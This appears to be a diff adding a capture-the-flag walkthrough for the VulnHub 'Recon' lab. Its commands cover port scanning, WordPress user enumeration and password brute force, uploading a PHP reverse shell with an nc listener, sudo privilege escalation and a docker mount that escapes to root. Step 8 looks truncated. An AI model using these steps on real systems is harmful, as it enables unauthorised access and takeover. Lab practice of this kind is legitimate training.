@@ -1,0 +1,38 @@
+Walkthrough Recon Vulhub
+
+Ip : 192.168.88.203
+Mission : Get Flag
+Link : https://download.vulnhub.com/recon/recon.ova
+
+1. nmap --top-ports 65536 192.168.88.203
+Output :
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 14:36 WIB
+Nmap scan report for 192.168.88.203
+Host is up (0.0016s latency).
+Not shown: 8338 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+2. wpscan --url http://192.168.88.203/ -e u
+Output : 
+User = reconauthor and recon, write in Users to get the password
+
+3. wpscan --url http://192.168.88.203/ -U Users -P ~/Download/rockyou.txt
+Example : Get password football17
+
+4. Login in http://192.168.88.203/wp-admin with user reconauthor and password football17
+
+5. Upload reverse_shell php and index.html you can get revershell in : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+6. nc -lvnp (port)
+
+7. if you connect you run this : python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+8. sudo -u offensive -nx -ex '!sh' -ex quit
+
+9. if you connect you run this : python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+10. Because user id is docker , to get flag you must run this: sudo docker run -it  -v /:/mnt ubuntu
+
+11. cd /mnt/root; cat flag.txt
